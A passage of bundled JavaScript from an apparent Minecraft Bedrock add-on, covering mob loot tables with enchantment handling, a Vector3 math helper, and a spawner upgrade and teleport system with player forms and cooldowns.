        { type: "multishot", minLevel: 1, maxLevel: 1 },
        // Tools
        { type: "efficiency", minLevel: 1, maxLevel: 5 },
        { type: "silk_touch", minLevel: 1, maxLevel: 1 },
        { type: "fortune", minLevel: 1, maxLevel: 3 },
        // Trident
        { type: "impaling", minLevel: 1, maxLevel: 5 },
        { type: "riptide", minLevel: 1, maxLevel: 3 },
        { type: "loyalty", minLevel: 1, maxLevel: 3 },
        { type: "channeling", minLevel: 1, maxLevel: 1 },
        // Mace
        { type: "density", minLevel: 1, maxLevel: 5 },
        { type: "breach", minLevel: 1, maxLevel: 4 },
        { type: "wind_burst", minLevel: 1, maxLevel: 3 },
        // Universal
        { type: "unbreaking", minLevel: 1, maxLevel: 3 },
        { type: "mending", minLevel: 1, maxLevel: 1 },
        { type: "swift_sneak", minLevel: 1, maxLevel: 3 },
        { type: "vanishing", minLevel: 1, maxLevel: 1 }
      ]
    };
    this.enchantmentIncompatibilities = {
      protection: ["fire_protection", "blast_protection", "projectile_protection"],
      fire_protection: ["protection", "blast_protection", "projectile_protection"],
      blast_protection: ["protection", "fire_protection", "projectile_protection"],
      projectile_protection: ["protection", "fire_protection", "blast_protection"],
      sharpness: ["smite", "bane_of_arthropods"],
      smite: ["sharpness", "bane_of_arthropods"],
      bane_of_arthropods: ["sharpness", "smite"],
      fortune: ["silk_touch"],
      silk_touch: ["fortune"],
      infinity: ["mending"],
      mending: ["infinity"],
      loyalty: ["riptide"],
      riptide: ["loyalty", "channeling"],
      channeling: ["riptide"]
    };
    _LootManager.instance = this;
    this.initialize();
  }
  /**
   * Loads loot tables from the database or uses defaults.
   */
  initialize() {
    for (const entityId in this.defaultEntities) {
      const savedLootTable = lootTableDatabase.read(entityId);
      this.entities[entityId] = savedLootTable || this.defaultEntities[entityId];
    }
  }
  /**
   * Saves a specific entity's loot table to the database.
   * @param entityId The entity ID (e.g., 'mrleefy:zombiestill')
   */
  saveLootTable(entityId) {
    if (this.entities[entityId] && Object.keys(this.entities[entityId]).length > 0) {
      lootTableDatabase.write(entityId, this.entities[entityId]);
    } else {
      lootTableDatabase.delete(entityId);
      delete this.entities[entityId];
    }
  }
  /**
   * Gets the Looting level from a player's held item.
   * @param player - Player object
   * @returns The level of Looting, or 0 if none.
   */
  getLootLevel(player) {
    try {
      const equipment = player.getComponent("equippable");
      const mainhandItem = equipment?.getEquipment("Mainhand");
      if (!mainhandItem)
        return 0;
      const enchantments = mainhandItem.getComponent("enchantable")?.getEnchantments() || [];
      const lootingEnchant = enchantments?.find((e) => e.type.id === "looting");
      return lootingEnchant ? lootingEnchant.level : 0;
    } catch (e) {
      return 0;
    }
  }
  /**
   * Calculates the final loot to be dropped based on chance and Looting level.
   * @param lootTable The loot table to process.
   * @param lootLevel The level of Looting enchantment.
   * @returns A final loot object with items and quantities.
   */
  calcLoot(lootTable, lootLevel, singleDrop = false) {
    const finalLoot = {};
    const lootTableEntries = Object.entries(lootTable);
    if (lootTableEntries.length === 0)
      return finalLoot;
    if (singleDrop) {
      const totalWeight = lootTableEntries.reduce((sum, [, cfg]) => sum + (cfg.chance ?? 100), 0);
      let roll = Math.random() * totalWeight;
      let picked = null;
      for (const entry of lootTableEntries) {
        roll -= entry[1].chance ?? 100;
        if (roll <= 0) {
          picked = entry;
          break;
        }
      }
      if (!picked)
        picked = lootTableEntries[lootTableEntries.length - 1];
      const [itemId, config] = picked;
      let dropQuantity = config.quantity ?? 1;
      if (lootLevel > 0 && config.stackable) {
        dropQuantity += Math.min(lootLevel, 3);
      }
      finalLoot[itemId] = { ...config, quantity: dropQuantity };
      return finalLoot;
    }
    for (const [itemId, config] of lootTableEntries) {
      const baseChance = config.chance ?? 100;
      const modifiedChance = baseChance * (1 + lootLevel * 0.1);
      if (Math.random() * 100 < modifiedChance) {
        let dropQuantity = config.quantity ?? 1;
        if (lootLevel > 0 && config.stackable) {
          const bonusChance = 0.25 * lootLevel;
          const bonusDrops = Math.floor(bonusChance + Math.random() * 0.5);
          dropQuantity += Math.min(bonusDrops, lootLevel);
        }
        finalLoot[itemId] = { ...config, quantity: dropQuantity };
      }
    }
    return finalLoot;
  }
  /**
   * Handles the entity death event to process and spawn loot.
   * @param event - EntityDieAfterEvent object
   */
  onEntityDeath(event) {
    const { deadEntity, damageSource } = event;
    if (!deadEntity?.isValid)
      return;
    const entityId = deadEntity.typeId;
    const lootTable = this.entities[entityId];
    if (!lootTable)
      return;
    const playerKillOnly = getCachedConfig("playerKillOnly", false);
    const killer = damageSource?.damagingEntity;
    if (playerKillOnly && (!killer || killer.typeId !== "minecraft:player")) {
      return;
    }
    const entityLocation = deadEntity.location;
    const entityDimension = deadEntity.dimension;
    const spillCap = getCachedConfig("itemSpillCap", 5);
    const nearbyItems = entityDimension.getEntities({
      type: "minecraft:item",
      location: entityLocation,
      maxDistance: 3,
      closest: spillCap
    });
    if (nearbyItems.length >= spillCap) {
      return;
    }
    const lootLevel = killer?.typeId === "minecraft:player" ? this.getLootLevel(killer) : 0;
    const singleDrop = entityId === "mrleefy:villagerstill";
    const finalLoot = this.calcLoot(lootTable, lootLevel, singleDrop);
    for (const cfg of Object.values(finalLoot)) {
      cfg.__lootLevel = lootLevel;
    }
    this.processLootDrops(finalLoot, entityDimension, entityLocation, lootLevel);
  }
  /**
   * Optimized loot drop processing
   * @param finalLoot - The calculated loot to drop
   * @param dimension - The dimension to spawn items in
   * @param location - The location to spawn items at
   */
  processLootDrops(finalLoot, dimension, location, lootLevel = 0) {
    const lootEntries = Object.entries(finalLoot);
    if (lootEntries.length === 0)
      return;
    const xpOrbs = [];
    const stackableItems = [];
    const nonStackableItems = [];
    for (const [itemId, config] of lootEntries) {
      if (itemId === "minecraft:xp_orb") {
        xpOrbs.push(config);
      } else if (config.stackable) {
        stackableItems.push({ itemId, config });
      } else {
        nonStackableItems.push({ itemId, config });
      }
    }
    for (const config of xpOrbs) {
      try {
        dimension.spawnEntity(ENTITIES.XP_ORB_TYPE, location, { amount: config.quantity });
      } catch (e) {
        console.warn(`[LootManager] Error spawning XP orb: ${e}`);
      }
    }
    for (const { itemId, config } of stackableItems) {
      try {
        const itemStack = this.createItemStack(itemId, config);
        dimension.spawnItem(itemStack, location);
      } catch (e) {
        console.warn(`[LootManager] Error spawning loot item ${itemId}: ${e}`);
      }
    }
    for (const { itemId, config } of nonStackableItems) {
      try {
        const itemStack = this.createItemStack(itemId, { ...config, quantity: 1 });
        dimension.spawnItem(itemStack, location);
      } catch (e) {
        console.warn(`[LootManager] Error spawning loot item ${itemId}: ${e}`);
      }
    }
  }
  /**
   * Creates an optimized ItemStack with enchantments and durability
   * @param itemId - The item identifier
   * @param config - The item configuration
   * @returns The created item stack
   */
  createItemStack(itemId, config) {
    const itemStack = new ItemStack(itemId, config.quantity);
    if (config.enchantments) {
      const enchComp = itemStack.getComponent("enchantable");
      if (enchComp) {
        try {
          enchComp.addEnchantment({ type: { id: config.enchantments.category }, level: 1 });
        } catch (e) {
          console.warn(`[LootManager] Failed to apply enchantment to ${itemId}: ${e}`);
        }
      }
    } else if (itemId === "minecraft:enchanted_book") {
      const enchComp = itemStack.getComponent("enchantable");
      if (enchComp) {
        try {
          const pool = this.enchantmentCategories["book"];
          if (pool && pool.length > 0) {
            const randomEnchant = pool[Math.floor(Math.random() * pool.length)];
            const lootLevel = config.__lootLevel ?? 0;
            const bonusTiers = lootLevel > 0 ? Math.floor(Math.random() * lootLevel) : 0;
            const scaledMax = Math.min(randomEnchant.maxLevel, randomEnchant.minLevel + bonusTiers + Math.floor(Math.random() * (randomEnchant.maxLevel - randomEnchant.minLevel + 1)));
            const level = Math.max(randomEnchant.minLevel, Math.min(scaledMax, randomEnchant.maxLevel));
            enchComp.addEnchantment({ type: { id: randomEnchant.type }, level });
          }
        } catch (e) {
          console.warn(`[LootManager] Failed to apply random enchantment to enchanted_book: ${e}`);
        }
      }
    } else if (config.enchantChance && Math.random() * 100 < config.enchantChance) {
      const category = ITEM_ENCHANT_CATEGORY[itemId];
      if (category) {
        const pool = this.enchantmentCategories[category];
        if (pool && pool.length > 0) {
          const enchComp = itemStack.getComponent("enchantable");
          if (enchComp) {
            try {
              const lootLevel = config.__lootLevel ?? 0;
              const existing = enchComp.getEnchantments?.() ?? [];
              const existingIds = new Set(existing.map((e) => e?.type?.id ?? ""));
              const incompatMap = this.enchantmentIncompatibilities;
              const eligible = pool.filter((e) => {
                const incompatible = incompatMap[e.type] ?? [];
                return !incompatible.some((ic) => existingIds.has(ic));
              });
              if (eligible.length > 0) {
                const randomEnchant = eligible[Math.floor(Math.random() * eligible.length)];
                const bonusTiers = lootLevel > 0 ? Math.floor(Math.random() * lootLevel) : 0;
                const level = Math.max(randomEnchant.minLevel, Math.min(randomEnchant.maxLevel, randomEnchant.minLevel + bonusTiers + Math.floor(Math.random() * (randomEnchant.maxLevel - randomEnchant.minLevel + 1))));
                enchComp.addEnchantment({ type: { id: randomEnchant.type }, level });
              }
            } catch (e) {
              console.warn(`[LootManager] Failed dynamic enchant on ${itemId}: ${e}`);
            }
          }
        }
      }
    }
    if (config.randomdurability) {
      const durability = itemStack.getComponent("durability");
      if (durability) {
        durability.damage = Math.floor(Math.random() * durability.maxDurability);
      }
    }
    return itemStack;
  }
};
// Singleton instance
__publicField(_LootManager, "instance");
var LootManager = _LootManager;
var lootManagerInstance = new LootManager();
world2.afterEvents.entityDie.subscribe((event) => {
  lootManagerInstance.onEntityDeath(event);
});

// src/levelsystem.ts
import {
  world as world3,
  system as system2,
  MolangVariableMap,
  ItemStack as ItemStack2
} from "@minecraft/server";
import {
  ActionFormData,
  ModalFormData
} from "@minecraft/server-ui";

// src/VectorMath/index.ts
var Vector32 = class _Vector3 {
  constructor(x, y, z) {
    __publicField(this, "x", 0);
    __publicField(this, "y", 0);
    __publicField(this, "z", 0);
    this.x = x;
    this.y = y;
    this.z = z;
  }
  /**
   * Adds 2 Vector3's together
   */
  static Add(pos1, pos2) {
    return new _Vector3(pos1.x + pos2.x, pos1.y + pos2.y, pos1.z + pos2.z);
  }
  /**
   * Subtracts a Vector3 from another Vector3
   */
  static Subtract(pos1, pos2) {
    return new _Vector3(pos1.x - pos2.x, pos1.y - pos2.y, pos1.z - pos2.z);
  }
  /**
   * Divides a Vector3 by another Vector3
   */
  static Divide(pos1, pos2) {
    return new _Vector3(pos1.x / pos2.x, pos1.y / pos2.y, pos1.z / pos2.z);
  }
  /**
   * Multiplies a Vector3 with a number
   */
  static Scale(pos1, num) {
    return new _Vector3(pos1.x * num, pos1.y * num, pos1.z * num);
  }
  /**
   * Multiplies 2 Vector3's
   */
  static Multiply(pos1, pos2) {
    return new _Vector3(pos1.x * pos2.x, pos1.y * pos2.y, pos1.z * pos2.z);
  }
  /**
   * Checks if 2 Vector3s are the same
   */
  static Equals(pos1, pos2, tolerance) {
    if (tolerance === void 0) {
      return pos1.x === pos2.x && pos1.y === pos2.y && pos1.z === pos2.z;
    } else {
      return Math.abs(pos1.x - pos2.x) <= tolerance && Math.abs(pos1.y - pos2.y) <= tolerance && Math.abs(pos1.z - pos2.z) <= tolerance;
    }
  }
  /**
   * Returns a Vector3 at 0, 0, 0
   */
  static Zero() {
    return new _Vector3(0, 0, 0);
  }
  /**
   * Returns a Vector3 at 0, 1, 0
   */
  static Up() {
    return new _Vector3(0, 1, 0);
  }
  /**
   * Returns a Vector3 at 0, -1, 0
   */
  static Down() {
    return new _Vector3(0, -1, 0);
  }
  /**
   * Returns a Vector3 at 0, 0, 1
   */
  static Forward() {
    return new _Vector3(0, 0, 1);
  }
  /**
   * Returns a Vector3 at 0, 0, -1
   */
  static Back() {
    return new _Vector3(0, 0, -1);
  }
  /**
   * Returns a Vector3 at -1, 0, 0
   */
  static Left() {
    return new _Vector3(-1, 0, 0);
  }
  /**
   * Returns a Vector3 at 1, 0, 0
   */
  static Right() {
    return new _Vector3(1, 0, 0);
  }
  /**
   * Gets the distance between 2 Vector3's
   */
  static Distance(pos1, pos2) {
    const dx = pos2.x - pos1.x;
    const dy = pos2.y - pos1.y;
    const dz = pos2.z - pos1.z;
    return Math.sqrt(dx * dx + dy * dy + dz * dz);
  }
  /**
   * Linearly interpolates a Vector3 to a Vector3 by a Number
   */
  static Lerp(pos1, pos2, tParam) {
    const x = pos1.x + (pos2.x - pos1.x) * tParam;
    const y = pos1.y + (pos2.y - pos1.y) * tParam;
    const z = pos1.z + (pos2.z - pos1.z) * tParam;
    return new _Vector3(x, y, z);
  }
  /**
   * Gets the dot product of 2 vectors
   */
  static Dot(pos1, pos2) {
    return pos1.x * pos2.x + pos1.y * pos2.y + pos1.z * pos2.z;
  }
  /**
   * Gets the cross product of 2 vectors
   */
  static Cross(pos1, pos2) {
    const x = pos1.y * pos2.z - pos1.z * pos2.y;
    const y = pos1.z * pos2.x - pos1.x * pos2.z;
    const z = pos1.x * pos2.y - pos1.y * pos2.x;
    return new _Vector3(x, y, z);
  }
  /**
   * Gets the magnitude of a vector
   */
  static Magnitude(pos) {
    return Math.sqrt(pos.x * pos.x + pos.y * pos.y + pos.z * pos.z);
  }
  /**
   * Gets the square magnitude of a vector
   */
  static SqrMagnitude(pos) {
    return pos.x * pos.x + pos.y * pos.y + pos.z * pos.z;
  }
  /**
   * Gets the squared distance between 2 vectors
   */
  static SqrDistance(pos1, pos2) {
    const dx = pos2.x - pos1.x;
    const dy = pos2.y - pos1.y;
    const dz = pos2.z - pos1.z;
    return dx * dx + dy * dy + dz * dz;
  }
  /**
   * Normalizes the vector
   */
  static Normalize(dir) {
    const mag = _Vector3.Magnitude(dir);
    if (mag !== 0) {
      return new _Vector3(dir.x / mag, dir.y / mag, dir.z / mag);
    } else {
      return new _Vector3(0, 0, 0);
    }
  }
};

// src/levelsystem.ts
function giveItemNatively(player, itemTypeId, amount) {
  try {
    const inventory = player.getComponent("inventory");
    const container = inventory?.container;
    if (container) {
      const itemStack = new ItemStack2(itemTypeId, amount);
      const remaining = container.addItem(itemStack);
      if (remaining && remaining.amount > 0) {
        player.dimension.spawnItem(remaining, player.location);
      }
    } else {
      player.dimension.spawnItem(new ItemStack2(itemTypeId, amount), player.location);
    }
  } catch (e) {
    console.error(`[Spawner System] Error giving item natively: ${e}`);
  }
}
var cooldowns = /* @__PURE__ */ new Map();
var spawnerDatabase = new Database("SpawnerLocations");
var activeForms = /* @__PURE__ */ new Map();
var PLAYER_MEMORY_LIMITS = {
  ACTIVE_FORMS: 100,
  // Max 100 concurrent form interactions
  MESSAGE_TIMES: 500,
  // Max 500 message timestamps
  INTERACTION_TIMESTAMPS: 200,
  // Max 200 interaction timestamps
  COOLDOWNS: 1e3
  // Max 1000 active cooldowns
};
var PLAYER_CLEANUP_INTERVAL = 150 * 20;
var cooldownTime = TIMING.FORM_COOLDOWN;
var messageTimes = /* @__PURE__ */ new Map();
var messageDelay = TIMING.MESSAGE_DELAY;
world3.beforeEvents.playerBreakBlock.subscribe((data) => {
  const { player, block } = data;
  const coordinates = `${block.x},${block.y},${block.z}`;
  if (!spawnerDatabase.has(coordinates) && !activeForms.has(coordinates)) {
    return;
  }
  if (activeForms.has(coordinates)) {
    const activeData = activeForms.get(coordinates);
    const activeTime = activeData.timestamp || Date.now();
    if (Date.now() - activeTime > 5 * 60 * 1e3) {
      activeForms.delete(coordinates);
    } else {
      data.cancel = true;
      player.sendMessage("\xA7cThis block cannot be broken while it is being used.");
      return;
    }
  }
  if (spawnerDatabase.has(coordinates)) {
    spawnerDatabase.delete(coordinates);
    if (!block.typeId.endsWith("_display")) {
      system2.run(() => removeSpawnruleAtLocation(block.x, block.y, block.z, block.dimension));
    }
  } else {
    const nearbyRadius = 1;
    const dimension = block.dimension;
    for (let dx = -nearbyRadius; dx <= nearbyRadius; dx++) {
      for (let dy = -nearbyRadius; dy <= nearbyRadius; dy++) {
        for (let dz = -nearbyRadius; dz <= nearbyRadius; dz++) {
          const nearbyCoordinates = `${block.x + dx},${block.y + dy},${block.z + dz}`;
          if (spawnerDatabase.has(nearbyCoordinates)) {
            const nearbyBlock = dimension.getBlock(new Vector32(block.x + dx, block.y + dy, block.z + dz));
            if (!nearbyBlock || !nearbyBlock.typeId.startsWith("mrleefy:")) {
              spawnerDatabase.delete(nearbyCoordinates);
              if (!nearbyBlock || !nearbyBlock.typeId.endsWith("_display")) {
                removeSpawnruleAtLocation(block.x + dx, block.y + dy, block.z + dz, dimension);
              }
            }
          }
        }
      }
    }
  }
});
world3.afterEvents.pistonActivate.subscribe((eventData) => {
  try {
    const dimension = eventData.dimension;
    const attachedBlocks = eventData.piston.getAttachedBlocksLocations();
    for (const blockCoord of attachedBlocks) {
      const block = dimension.getBlock(blockCoord);
      if (block && block.typeId.startsWith("mrleefy:") && block.typeId.includes("spawner") && !block.typeId.endsWith("_display")) {
        removeSpawnruleAtLocation(blockCoord.x, blockCoord.y, blockCoord.z, dimension);
        const coordinates = `${blockCoord.x},${blockCoord.y},${blockCoord.z}`;
        if (spawnerDatabase.has(coordinates)) {
          spawnerDatabase.delete(coordinates);
        }
      }
    }
  } catch (error) {
    console.error("Error in piston event handler:", error);
  }
});
world3.beforeEvents.explosion.subscribe((eventData) => {
  const dimension = eventData.dimension;
  const allowedBlocks = eventData.getImpactedBlocks().filter((blockCoord) => {
    const block = dimension.getBlock(new Vector32(blockCoord.x, blockCoord.y, blockCoord.z));
    if (block && block.typeId.startsWith("mrleefy:") && block.typeId.includes("spawner") && !block.typeId.endsWith("_display")) {
      return false;
    }
    return true;
  });
  eventData.setImpactedBlocks(allowedBlocks);
});
world3.afterEvents.playerPlaceBlock.subscribe((data) => {
  const player = data.player;
  const block = data.block;
  const typeId = block.typeId;
  if (typeId.startsWith("mrleefy:")) {
    if (typeId.endsWith("_display")) {
      return;
    }
    const coordinates = `${block.x},${block.y},${block.z}`;
    const spawnerData = {
      typeId,
      placedBy: player.name || player.nameTag || "Unknown",
      placedAt: Date.now(),
      entitiesKilled: 0,
      lastAccessed: Date.now()
    };
    spawnerDatabase.write(coordinates, spawnerData);
    try {
      const ent = player.dimension.spawnEntity("mrleefy:spawnrule", { x: block.x + 0.5, y: block.y + 0.5, z: block.z + 0.5 });
      ent.nameTag = typeId;
    } catch (error) {
      console.error("Error spawning entity natively:", error);
    }
  }
});
function handleSpawnerBlockInteraction(player, block, cancelableEvent) {
  const coordinates = `${block.x},${block.y},${block.z}`;
  const typeId = block.typeId;
  if (!typeId || !typeId.startsWith("mrleefy:") || !typeId.includes("spawner")) {
    return;
  }
  if (typeId.endsWith("_display")) {
    return;
  }
  cancelableEvent.cancel = true;
  if (activeForms.has(coordinates)) {
    const activeData = activeForms.get(coordinates);
    const interactingPlayer = activeData.player || activeData;
    const activeTime = activeData.timestamp || Date.now();
    if (Date.now() - activeTime > 5 * 60 * 1e3) {
      activeForms.delete(coordinates);
    } else if (interactingPlayer.id !== player.id) {
      player.sendMessage("\xA77This \xA7cspawner\xA77 is currently in use, \xA7cplease wait...");
      return;
    }
  }
  updateSpawnerDatabaseOnInteraction(coordinates, typeId, player);
  system2.run(() => {
    const spawnerType = typeId.replace("mrleefy:", "").replace(/spawner\d*/, "");
    const levelMatch = typeId.match(/\d*$/);
    const level = levelMatch ? Number(levelMatch[0]) : 0;
    const c = 1e4;
    const y = 100;
    const cost = level * c;
    const upgradee = level + 1;
    const downgradee = level - 1;
    const refu = 77;
    const percentrefund = cost / y * refu;
    form1(player, level, cost, block, typeId, upgradee, downgradee, percentrefund, refu, spawnerType, block.x, block.y, block.z);
  });
}
if ("playerInteractWithBlock" in world3.beforeEvents) {
  world3.beforeEvents.playerInteractWithBlock.subscribe((data) => {
    handleSpawnerBlockInteraction(data.player, data.block, data);
  });
} else {
  world3.beforeEvents.itemUseOn.subscribe((data) => {
    handleSpawnerBlockInteraction(data.source, data.block, data);
  });
}
function isPlayerNearBlock(player, x, y, z, maxDistance = 10) {
  if (!player || !player.isValid)
    return false;
  const pLoc = player.location;
  const dx = pLoc.x - (x + 0.5);
  const dy = pLoc.y - (y + 0.5);
  const dz = pLoc.z - (z + 0.5);
  return dx * dx + dy * dy + dz * dz <= maxDistance * maxDistance;
}
function validateSpawnerInteraction(player, block, level, x, y, z) {
  if (!player || !player.isValid) {
    console.error(ERROR_MESSAGES.INVALID_PLAYER);
    return false;
  }
  if (!isPlayerNearBlock(player, x, y, z, 10)) {
    player.sendMessage("\xA7cYou are too far from the spawner.");
    return false;
  }
  if (!block || !block.isValid) {
    player.sendMessage(ERROR_MESSAGES.INVALID_BLOCK);
    return false;
  }
  if (typeof level !== "number" || level < VALIDATION.MIN_LEVEL || level > VALIDATION.MAX_LEVEL) {
    console.error(`Invalid level provided: ${level}`);
    player.sendMessage(ERROR_MESSAGES.INVALID_LEVEL);
    return false;
  }
  if (typeof x !== "number" || typeof y !== "number" || typeof z !== "number") {
    console.error(ERROR_MESSAGES.INVALID_COORDINATES);
    player.sendMessage(ERROR_MESSAGES.INVALID_COORDINATES);
    return false;
  }
  return true;
}
function checkPlayerCooldown(player, coordinates) {
  const currentTime = Date.now();
  const key = player.name;
  if (cooldowns.has(key)) {
    const lastInteractionTime = cooldowns.get(key);
    const timeSinceLastInteraction = currentTime - lastInteractionTime;
    if (timeSinceLastInteraction < cooldownTime) {
      const remainingTime = Math.ceil((cooldownTime - timeSinceLastInteraction) / 1e3);
      if (!messageTimes.has(key) || currentTime - messageTimes.get(key) > messageDelay) {
        player.sendMessage(`\xA7cWait ${remainingTime}s before interacting again.`);
        messageTimes.set(key, currentTime);
      }
      return false;
    }
  }
  activeForms.set(coordinates, { player, timestamp: currentTime });
  cooldowns.set(key, currentTime);
  return true;
}
function ensureSpawnruleEntity(player, x, y, z, typeId) {
  if (typeof x !== "number" || typeof y !== "number" || typeof z !== "number") {
    console.error(`Invalid coordinates: x=${x}, y=${y}, z=${z}`);
    return;
  }
  if (!typeId || typeof typeId !== "string") {
    console.error(`Invalid typeId: ${typeId}`);
    return;
  }
  try {
    const dimension = player.dimension;
    const entities = dimension.getEntities({
      location: { x: x + 0.5, y: y + 0.5, z: z + 0.5 },
      maxDistance: 0.8,
      type: "mrleefy:spawnrule"
    });
    if (entities.length === 0) {
      const ent = dimension.spawnEntity("mrleefy:spawnrule", { x: x + 0.5, y: y + 0.5, z: z + 0.5 });
      ent.nameTag = typeId;
    }
  } catch (error) {
    console.error(`Error ensuring spawnrule entity natively: ${error}`);
  }
}
function createSpawnerForm(player, level, upgradee, downgradee, spawnerType, block, typeId, percentrefund, refu, x, y, z, coordinates) {
  const form12 = new ActionFormData();
  form12.title(`\xA7l\xA78${spawnerType}Spawner\xA72\xA7r`);
  form12.body(`\xA77\xA7l
                \xA77Level: \xA72${level}\xA7r

`);
  const buttonActions = [];
  if (level < UI.MAX_SPAWNER_LEVEL) {
    form12.button(`\xA7l\xA72Upgrade\xA78 to Lvl ${upgradee}`, "textures/carrot_golden");
    buttonActions.push(() => upgradeSpawner(player, block, level, spawnerType, typeId, x, y, z));
  }
  if (level < UI.MAX_SPAWNER_LEVEL) {
    form12.button(`\xA7l\xA72Upgrade Max`, "textures/items/netherite_ingot");
    buttonActions.push(() => maxUpgradeSpawner(player, block, level, spawnerType, typeId, x, y, z));
  }
  if (level > UI.MIN_SPAWNER_LEVEL) {
    form12.button(`\xA7l\xA78Downgrade [\xA74${downgradee}\xA78]`, "textures/carrot");
    buttonActions.push(() => downgrade(player, block, level, spawnerType, percentrefund, refu, x, y, z));
  }
  form12.button(`\xA7l\xA72Teleport Stack Here`, "textures/items/ender_eye");
  buttonActions.push(() => teleportSpawnerStack(player, block, spawnerType, x, y, z));
  form12.button(`\xA7l\xA78Instructions`, "textures/items/book_enchanted.png");
  buttonActions.push(() => showInstructions(player));
  if (player.hasTag(UI.OWNER_PERMISSION_TAG)) {
    form12.button(`\xA78\xA7lChoose Level`, "textures/items/diamond");
    const chooseLevelAction = () => slider(player, spawnerType, block, level, 1e4 * level, typeId, upgradee, downgradee, percentrefund, refu, x, y, z);
    chooseLevelAction.isNested = true;
    buttonActions.push(chooseLevelAction);
  }
  form12.button(`\xA7l\xA78Close`, "textures/ruby");
  buttonActions.push(() => exit(player));
  return { form: form12, buttonActions };
}
function form1(player, level, cost, block, typeId, upgradee, downgradee, percentrefund, refu, spawnerType, x, y, z) {
  const coordinates = `${x},${y},${z}`;
  if (!validateSpawnerInteraction(player, block, level, x, y, z)) {
    return;
  }
  if (!checkPlayerCooldown(player, coordinates)) {
    return;
  }
  ensureSpawnruleEntity(player, x, y, z, typeId);
  const { form, buttonActions } = createSpawnerForm(player, level, upgradee, downgradee, spawnerType, block, typeId, percentrefund, refu, x, y, z, coordinates);
  system2.run(() => {
    form.show(player).then((response) => {
      const isNested = response.selection !== void 0 && buttonActions[response.selection] && buttonActions[response.selection].isNested;
      if (!isNested) {
        activeForms.delete(coordinates);
      } else {
        activeForms.set(coordinates, { player, timestamp: Date.now() });
      }
      const dimension = block.dimension;
      const currentBlock = dimension.getBlock(new Vector32(x, y, z));
      if (!currentBlock || currentBlock.typeId !== typeId) {
        player.sendMessage(ERROR_MESSAGES.INVALID_BLOCK);
        spawnerDatabase.delete(coordinates);
        activeForms.delete(coordinates);
        return;
      }
      if (response.selection !== void 0 && buttonActions[response.selection]) {
        buttonActions[response.selection]();
      }
    }).catch(() => {
      activeForms.delete(coordinates);
    });
  });
}
var interactionTimestamps = /* @__PURE__ */ new Map();
var globalCooldowns = /* @__PURE__ */ new Map();
var INTERACTION_WINDOW_MILLIS = 120 * 1e3;
var INTERACTION_LIMIT = 3;
var GLOBAL_COOLDOWN_MILLIS = 10 * 60 * 1e3;
function teleportSpawnerStack(player, block, spawnerType, x, y, z) {
  if (!player || !player.isValid) {
    console.error("Invalid player provided to teleportSpawnerStack");
    return;
  }
  if (!isPlayerNearBlock(player, x, y, z, 10)) {
    player.sendMessage("\xA7cYou are too far from the spawner.");
    return;
  }
  if (!block || !block.isValid) {
    player.sendMessage("\xA7cInvalid spawner block detected.");
    return;
  }
  if (!spawnerType || typeof spawnerType !== "string") {
    console.error(`Invalid spawnerType provided: ${spawnerType}`);
    player.sendMessage("\xA7cInvalid spawner type detected.");
    return;
  }
  if (typeof x !== "number" || typeof y !== "number" || typeof z !== "number") {
    console.error("Invalid coordinates provided to teleportSpawnerStack");
    player.sendMessage("\xA7cInvalid spawner location detected.");
    return;
  }
  const currentTime = Date.now();
  const key = player.name;
  if (globalCooldowns.has(key)) {
    const lastCooldownTime = globalCooldowns.get(key);
    const timeElapsed = currentTime - lastCooldownTime;
    if (timeElapsed < GLOBAL_COOLDOWN_MILLIS) {
      const remainingSeconds = Math.ceil((GLOBAL_COOLDOWN_MILLIS - timeElapsed) / 1e3);
      player.sendMessage(`\xA7dPlease wait ${remainingSeconds}s before teleporting entity stacks...`);
      return;
    } else {
      globalCooldowns.delete(key);
    }
  }
  if (!interactionTimestamps.has(key)) {
    interactionTimestamps.set(key, []);
  }
  const timestamps = interactionTimestamps.get(key);
  while (timestamps.length > 0 && currentTime - timestamps[0] > INTERACTION_WINDOW_MILLIS) {
    timestamps.shift();
  }
  timestamps.push(currentTime);
  if (timestamps.length > INTERACTION_LIMIT) {
    globalCooldowns.set(key, currentTime);
    const remainingSeconds = Math.ceil(GLOBAL_COOLDOWN_MILLIS / 1e3);
    player.sendMessage(`\xA7dPlease wait ${remainingSeconds}s before teleporting entity stacks...`);
    return;
  }
  const dimension = block.dimension;
  const searchRadius = configDatabase2.read("stackRadius") || 50;
  const sanitizedSpawnerType = spawnerType.replace(/_/g, "");
  const entityType = `mrleefy:${sanitizedSpawnerType}still`;
  const nearbyEntities = dimension.getEntities({
    type: entityType,
    location: block.location,
    maxDistance: searchRadius
  });
  if (!nearbyEntities || nearbyEntities.length === 0) {
    player.sendMessage(`\xA7cNo entities of type ${sanitizedSpawnerType} found near the spawner.`);
    return;
  }
  let closestEntity = null;
  let closestDistance = Infinity;
  for (const entity of nearbyEntities) {
    try {
      if (!entity || !entity.isValid)
        continue;
      const distance = Math.sqrt(
        Math.pow(entity.location.x - x, 2) + Math.pow(entity.location.y - y, 2) + Math.pow(entity.location.z - z, 2)
      );
      if (distance < closestDistance) {
        closestDistance = distance;
        closestEntity = entity;
      }
    } catch (error) {
      console.error(`Error processing entity: ${error.message}`);
    }
  }
  if (closestEntity) {
    const centerX = x + 0.5;
    const centerY = y + 1;
    const centerZ = z + 0.5;
    closestEntity.teleport(
      new Vector32(centerX, centerY, centerZ),
      { keepVelocity: true }
    );
    player.sendMessage(`\xA7aTeleported ${sanitizedSpawnerType} stack to spawner`);
  } else {
    player.sendMessage(`\xA7cNo valid entities found to teleport.`);
  }
}
function slider(player, spawnerType, block, level, cost, typeId, upgradee, downgradee, percentrefund, refu, x, y, z) {
  if (!player || !player.isValid) {
    console.error("Invalid player provided to slider");
    return;
  }
  const coordinates = `${x},${y},${z}`;
  if (!player.hasTag(`admin`)) {
    player.sendMessage("\xA7cYou don't have permission to use this feature.");
    activeForms.delete(coordinates);
    return;
  }
  if (!isPlayerNearBlock(player, x, y, z, 10)) {
    player.sendMessage("\xA7cYou are too far from the spawner.");
    activeForms.delete(coordinates);
    return;
  }
  if (!block || !block.isValid) {
    player.sendMessage("\xA7cInvalid spawner block detected.");
    activeForms.delete(coordinates);
    return;
  }
  if (typeof level !== "number" || level < 1 || level > 32) {
    console.error(`Invalid level provided: ${level}`);
    player.sendMessage("\xA7cInvalid spawner level detected.");
    activeForms.delete(coordinates);
    return;
  }
  if (!spawnerType || typeof spawnerType !== "string") {
    console.error(`Invalid spawnerType provided: ${spawnerType}`);
    player.sendMessage("\xA7cInvalid spawner type detected.");
    activeForms.delete(coordinates);
    return;
  }
  const slider2 = new ModalFormData();
  slider2.title("Select Spawner Level");
